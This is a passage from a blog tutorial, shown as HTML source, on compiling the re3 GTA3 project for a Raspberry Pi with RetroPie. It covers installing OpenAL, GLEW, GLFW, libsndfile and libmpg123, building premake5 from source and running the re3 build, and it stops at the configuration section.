&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#openal&quot;&gt;OpenAL&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#glew&quot;&gt;GLEW&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#glfw&quot;&gt;GLFW&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#libsndfile&quot;&gt;libsndfile&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#libmpg123&quot;&gt;libmpg123&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href=&quot;#compiling-re3-project&quot;&gt;Compiling re3 Project&lt;/a&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#premake5&quot;&gt;Premake5&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#compiling-the-re3-project&quot;&gt;Compiling the re3 Project&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href=&quot;#configuring-re3-project&quot;&gt;Configuring re3 Project&lt;/a&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#getting-gta3-files&quot;&gt;Getting GTA3 Files&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#copying-across-re3-files&quot;&gt;Copying Across re3 Files&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#running-without-a-desktop-environment&quot;&gt;Running without a Desktop Environment&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#configuring-re3-for-the-raspberry-pi&quot;&gt;Configuring re3 for the Raspberry Pi&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#creating-a-retropie-ports-entry&quot;&gt;Creating a RetroPie Ports Entry&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#conclusion&quot;&gt;Conclusion&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/div&gt;
&lt;h2 id=&quot;setup-re3-environment&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#setup-re3-environment&quot; aria-label=&quot;setup re3 environment permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Setup re3 Environment&lt;/h2&gt;
&lt;p&gt;This section will get us set up for the rest of the tutorial. I like to keep a project and all the files in a dedicated folder. So I started by creating a &lt;code class=&quot;language-text&quot;&gt;ports&lt;/code&gt; folder in my home directory, where I plan to keep all my non-RetroPie games.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;mkdir -p ~/ports/GTA3
cd ~/ports/GTA3&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Assume you will be in this folder for the remainder of the tutorial. For each section, you may make subfolders - and traverse between them - so make sure you return here (&lt;code class=&quot;language-text&quot;&gt;~/ports/GTA3&lt;/code&gt;) after each section (if you are following this tutorial word-for-word).&lt;/p&gt;
&lt;p&gt;Next, we should download the &lt;a href=&quot;https://github.com/GTAmodding/re3&quot;&gt;re3 project files&lt;/a&gt;. They have no releases on GitHub at the time of writing, so I just pulled from the &lt;code class=&quot;language-text&quot;&gt;master&lt;/code&gt; branch. The specific git commit I used was &lt;code class=&quot;language-text&quot;&gt;a4412e8d636175670017b4aba5874bb3dc1c48a5&lt;/code&gt;. Which was the latest commit at the time of writing.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;git clone --recursive https://github.com/GTAmodding/re3.git&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Note that you can &lt;code class=&quot;language-text&quot;&gt;checkout&lt;/code&gt; a specific commit version, using the value provided above, but the project seems in constant development - so grab the latest version. Additionally, since the re3 project is consistently being updated - we will later cover how to update the project. Now we are ready to start installing the re3 requirements.&lt;/p&gt;
&lt;h2 id=&quot;meeting-re3-requirements&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#meeting-re3-requirements&quot; aria-label=&quot;meeting re3 requirements permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Meeting re3 Requirements&lt;/h2&gt;
&lt;p&gt;According to the &lt;a href=&quot;https://github.com/GTAmodding/re3/wiki/Building-on-Linux&quot;&gt;Building on Linux&lt;/a&gt; page on the &lt;a href=&quot;https://github.com/GTAmodding/re3/wiki/&quot;&gt;re3 wiki&lt;/a&gt;, you need the following requirements to be met. In the list, the name of the project is followed by the usual package name.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;OpenAL: &lt;code class=&quot;language-text&quot;&gt;libopenal-dev&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;GLEW: &lt;code class=&quot;language-text&quot;&gt;libglew-dev&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;GLFW: &lt;code class=&quot;language-text&quot;&gt;libglfw3-dev&lt;/code&gt; (min. 3.3 is required)&lt;/li&gt;
&lt;li&gt;libsndfile: &lt;code class=&quot;language-text&quot;&gt;libsndfile1-dev&lt;/code&gt; (Caution: install before libmpg123-dev, optional)&lt;/li&gt;
&lt;li&gt;libmpg123: &lt;code class=&quot;language-text&quot;&gt;libmpg123-dev&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&quot;openal&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#openal&quot; aria-label=&quot;openal permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;OpenAL&lt;/h3&gt;
&lt;p&gt;A cross-platform 3D audio API, commonly used with gaming applications. The simple requirement to meet. Install from Raspian repositories:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;sudo apt install libopenal-dev&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Version used in this tutorial: &lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;libopenal-dev/stable,now 1:1.19.1-1 armhf [installed]&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h3 id=&quot;glew&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#glew&quot; aria-label=&quot;glew permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;GLEW&lt;/h3&gt;
&lt;p&gt;The complete name is the OpenGL Extension Wrangler Library - or GLEW for short. Also cross-platform, and used to help determine which OpenGL extensions are supported on the target platform. Another simple requirement to meet. Install from Raspian repositories:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;sudo apt install libglew-dev&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Version used in this tutorial: &lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;libglew-dev/stable,now 2.1.0-4 armhf [installed]&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h3 id=&quot;glfw&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#glfw&quot; aria-label=&quot;glfw permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;GLFW&lt;/h3&gt;
&lt;p&gt;Another cross-platform library - this one is for aiding OpenGL development. Unfortunately, this one is a little tricky. The re3 wiki states version 3.3 is the minimum requirements. However, the version of Raspian I was using was 3.2 - as seen below…&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;pi@retropie:~/ports/GTA3 $ apt list libglfw3-dev
Listing... Done
libglfw3-dev/stable 3.2.1-1 armhf&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Just for fun - I tested to see if version 3.2 was sufficient. It is not! Trust the developers and their documentation! So, the only option is to install it from the source. Start by uninstalling the Raspian package, just in case you installed it:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;sudo apt remove --purge libglfw3-dev&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/glfw/glfw&quot;&gt;GLFW is hosted on GitHub&lt;/a&gt;. You could clone directly from the &lt;code class=&quot;language-text&quot;&gt;master&lt;/code&gt; branch, but I decided to get the most recent release for several reasons (get consistency in this blog post so others can follow and that it is more stable). I got GLFW version 3.3.2 - which was the most recent release (at time of writing) and above the 3.3 requirements specified by the re3 documentation. Make sure to get the source code in &lt;code class=&quot;language-text&quot;&gt;.tar.gz&lt;/code&gt; format.&lt;/p&gt;
&lt;p&gt;Download the source code. You can download this anywhere in your file system. But I choose to make a directory in my home folder for all my re3 stuff (as discussed earlier).&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;cd ~/ports/GTA3
wget https://github.com/glfw/glfw/archive/3.3.2.tar.gz&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Extract the contents:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;tar xvf 3.3.2.tar.gz &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Enter the extracted directory, configure the build environment, then compile the code:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;cd glfw-3.3.2/
cmake .
cmake -DBUILD_SHARED_LIBS=ON .&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Finally, install the compiled code so it is available system-wide.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;sudo make install&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;An FYI - if you want to remove it later, say when you want to upgrade the GLFW version:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;# ONLY RUN THIS IF YOU WANT TO UNINSTALL LATER
sudo make uninstall&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Compiling from source is sometimes a pain. But following the developer documentation always helps. Or maybe I have been hanging out in a Linux shell and compiling projects for too long!&lt;/p&gt;
&lt;h3 id=&quot;libsndfile&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#libsndfile&quot; aria-label=&quot;libsndfile permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;libsndfile&lt;/h3&gt;
&lt;p&gt;A library, written in C, for reading/writing sampled audio data. Without doing any investigation - guessing it is used for playing the GTA3 audio files in-game. The re3 documentation says it is optional - but I decided to install it. Another simple requirement to meet. Install from Raspian repositories:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;sudo apt install libsndfile1-dev&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Version used in this tutorial: &lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;libsndfile1-dev/stable,now 1.0.28-6 armhf [installed]&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h3 id=&quot;libmpg123&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#libmpg123&quot; aria-label=&quot;libmpg123 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;libmpg123&lt;/h3&gt;
&lt;p&gt;An MP3 library for UNIX - claiming to be fast, fast, fast! Another simple requirement to meet. Install from Raspian repositories:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;sudo apt install libmpg123-dev&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Version used in this tutorial: &lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;libmpg123-dev/stable,now 1.25.10-2 armhf [installed]&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;This is the last requirement specified by re3 - so on to building the re3 project!&lt;/p&gt;
&lt;h2 id=&quot;compiling-re3-project&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#compiling-re3-project&quot; aria-label=&quot;compiling re3 project permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Compiling re3 Project&lt;/h2&gt;
&lt;p&gt;So, we have our project requirements done. Time to start work on the re3 code base.&lt;/p&gt;
&lt;h3 id=&quot;premake5&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#premake5&quot; aria-label=&quot;premake5 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Premake5&lt;/h3&gt;
&lt;p&gt;After reading the entire &lt;a href=&quot;https://github.com/GTAmodding/re3/wiki/Building-on-Linux&quot;&gt;Building on Linux&lt;/a&gt; guide from the re3 developers, I figured out that I needed to install &lt;code class=&quot;language-text&quot;&gt;premake5&lt;/code&gt; from source code… as we want to build on the ARM architecture present on the Raspberry Pi. Quote from the re3 developers to highlight this…&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;If you’re on i.e. arm/arm64, you need to build your own premake5 from the source. Then you can proceed to run premake5 with —with-librw gmake2 arguments.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;I haven’t used premake before or even heard of it before trying to get re3 running. The developers describe it as a build configuration tool. I try to be thorough, so I checked the most recent version of premake on Raspian:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;pi@retropie:~/ports/GTA3 $ apt list premake4
Listing... Done
premake4/stable 4.3+repack1-2 armhf&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;So… yes! We need to do some building from source - version 4 is not sufficient. To get premake5, I followed the &lt;a href=&quot;https://github.com/premake/premake-core/wiki/Building-Premake&quot;&gt;Building Premake&lt;/a&gt; documentation from the premake developers. The &lt;a href=&quot;https://github.com/premake/premake-core&quot;&gt;premake-core project is hosted on GitHub&lt;/a&gt;. Instead of getting the bleeding-edge code from &lt;code class=&quot;language-text&quot;&gt;master&lt;/code&gt;, I went for the latest release, which was Premake 5.0 alpha 15. Make sure to see if there is a newer version in their releases on GitHub. Start by downloading it:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;cd ~/ports/GTA3
wget https://github.com/premake/premake-core/archive/v5.0.0-alpha15.tar.gz&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Extract the archive:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;tar xvf v5.0.0-alpha15.tar.gz &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Bootstrap the premake executable:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;cd premake-core-5.0.0-alpha15/
make -f Bootstrap.mak linux&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;This will give you a premake binary (executable) for arm64. We did all of this, as the &lt;code class=&quot;language-text&quot;&gt;premake5Linux&lt;/code&gt; binary supplied in the re3 repo is for usual Desktop Linux systems (i386 or amd64), not arm64 as present on the Raspberry Pi 4. I thought an easy way to make the premake executable available to re3 is to copy the binary to the re3 folder and give it a distinguishable name, in this case, the name is &lt;code class=&quot;language-text&quot;&gt;premake5LinuxArm&lt;/code&gt;. FYI - this newly compiled executable is in the &lt;code class=&quot;language-text&quot;&gt;bin/releases&lt;/code&gt; folder.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;cd bin/release
cp premake5 ~/GTA3/re3/premake5LinuxArm&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;To just sum what happened. We entered the &lt;code class=&quot;language-text&quot;&gt;bin/release&lt;/code&gt; folder in premake. This is where our nice binary was compiled to. Then we copy it to the base folder of the re3 project. This is the same re3 folder as the &lt;code class=&quot;language-text&quot;&gt;premake5Linux&lt;/code&gt; binary, and &lt;code class=&quot;language-text&quot;&gt;premake5.exe&lt;/code&gt; binary.&lt;/p&gt;
&lt;h3 id=&quot;compiling-the-re3-project&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#compiling-the-re3-project&quot; aria-label=&quot;compiling the re3 project permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Compiling the re3 Project&lt;/h3&gt;
&lt;p&gt;Finally! We are ready to go. Requirements have been met. From here, it is pretty easy to finish up compiling re3. Start by using our beautiful premake binary to configure the re3 build. Note how we use our &lt;code class=&quot;language-text&quot;&gt;premake4LinuxArm&lt;/code&gt; binary that we compiled in the last section.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;cd ~/ports/GTA3/re3
./premake5LinuxArm --with-librw gmake2&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Now time to compile the re3 source code. Make sure you enter the &lt;code class=&quot;language-text&quot;&gt;build&lt;/code&gt; directory for this. And that you use the correct config option - in our case the arm64 config.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;cd build
make config=release_linux-arm64-librw_gl3_glfw-oal&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Time to take a break. Compiling a decent-sized project takes some time. Especially as our Raspberry Pi is not the most grunty system. I guesstimate that it took about 10 to 20 minutes on my Pi 4. I do not have an exact figure - I had finished a couple of beers by this time.&lt;/p&gt;
&lt;h2 id=&quot;configuring-re3-project&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#configuring-re3-project&quot; aria-label=&quot;configuring re3 project permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Configuring re3 